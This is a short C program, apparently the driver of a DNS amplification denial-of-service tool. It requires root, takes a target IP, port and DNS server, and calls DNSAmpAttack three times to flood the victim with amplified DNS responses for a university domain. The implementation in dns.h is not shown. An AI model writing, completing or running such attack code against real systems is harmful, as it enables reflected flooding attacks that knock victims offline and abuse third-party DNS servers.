#include "dns.h"
#include "stdio.h"
#include "stdlib.h"

int main(int argc, char** argv) {
    if(getuid() != 0) {
        printf("Run as root\n");
        return 1;
    }

    if(argc < 4) {
        printf("Usage %s <target ip> <target port> <dns server>\n", argv[0]);
        return 1;
    }

    for(int i = 0; i < 3; i++) {
        DNSAmpAttack(argv[1], atoi(argv[2]), argv[3], "nctu.edu.tw");
        sleep(2);
    }

    return 0;
}